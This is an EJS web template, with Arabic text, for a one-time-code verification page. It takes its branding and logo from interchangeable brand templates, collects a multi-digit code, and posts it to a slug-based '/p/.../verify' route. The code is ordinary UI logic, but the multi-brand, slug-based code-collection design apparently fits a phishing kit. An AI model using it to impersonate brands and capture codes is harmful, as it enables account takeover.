<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="auth">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %>
    <div class="logo-svg"><%- logos[tpl.key] %></div>
  <% } else { %>
    <div class="logo"><%= tpl.name.charAt(0) %></div>
  <% } %>
  <h1><%= pageContent.headline %></h1>
  <p class="sub"><%= pageContent.subheadline %></p>

  <% if (typeof error !== 'undefined' && error) { %>
    <div style="background:#ef444420;border:1px solid #ef444440;border-radius:9px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;text-align:center"><%= error %></div>
  <% } %>

  <form method="POST" action="/p/<%= page.slug %>/verify" id="otpForm">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug || 'verify' %>">
    <div class="otp-wrap" id="otpWrap">
      <% for (let i = 0; i < (pageContent.otp_length || 6); i++) { %>
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
      <% } %>
    </div>
    <input type="hidden" name="code" id="codeHidden">
    <button type="submit" id="submitBtn" disabled><%= pageContent.cta || 'تأكيد' %></button>
  </form>

  <div style="text-align:center;font-size:.83rem;margin-top:16px;opacity:.75">
    الكود صالح <span class="timer" id="timer">05:00</span>
  </div>
  <div style="text-align:center;margin-top:14px">
    <button type="button" id="resendBtn" style="background:transparent;border:1px solid rgba(255,255,255,.2);color:var(--fg);font-size:.85rem;padding:8px 20px;width:auto;opacity:.7" onclick="resendOTP()">إعادة إرسال الكود</button>
  </div>
</div>

<script>
  const inputs = document.querySelectorAll('#otpWrap input');
  const hidden = document.getElementById('codeHidden');
  const submitBtn = document.getElementById('submitBtn');
  const len = inputs.length;

  function sync() {
    const code = Array.from(inputs).map(i => i.value).join('');
    hidden.value = code;
    submitBtn.disabled = code.length !== len;
  }

  inputs.forEach((inp, i) => {
    inp.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g,'');
      if (e.target.value && i < len - 1) inputs[i+1].focus();
      sync();
    });
    inp.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !e.target.value && i > 0) inputs[i-1].focus();
    });
  });

  let t = 300;
  const timerEl = document.getElementById('timer');
  const iv = setInterval(() => {
    t--;
    if (t <= 0) { timerEl.textContent = 'انتهى'; clearInterval(iv); return; }
    timerEl.textContent = `${String(Math.floor(t/60)).padStart(2,'0')}:${String(t%60).padStart(2,'0')}`;
  }, 1000);

  if (inputs[0]) inputs[0].focus();

  // Paste support
  document.addEventListener('paste', e => {
    const txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
    if (!txt) return;
    inputs.forEach((inp, i) => { inp.value = txt[i] || ''; });
    sync();
    const last = Math.min(txt.length, len) - 1;
    if (inputs[last]) inputs[last].focus();
  });

  async function resendOTP() {
    const btn = document.getElementById('resendBtn');
    btn.disabled = true; btn.textContent = 'جاري...';
    try {
      const r = await fetch('/p/<%= page.slug %>/resend-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({_csrf:'<%= csrfToken %>'}) });
      const d = await r.json();
      btn.textContent = d.message || 'تم الإرسال';
      t = 300;
    } catch { btn.textContent = 'خطأ'; }
    setTimeout(() => { btn.disabled = false; btn.textContent = 'إعادة إرسال الكود'; }, 30000);
  }
</script>
</body>
</html>
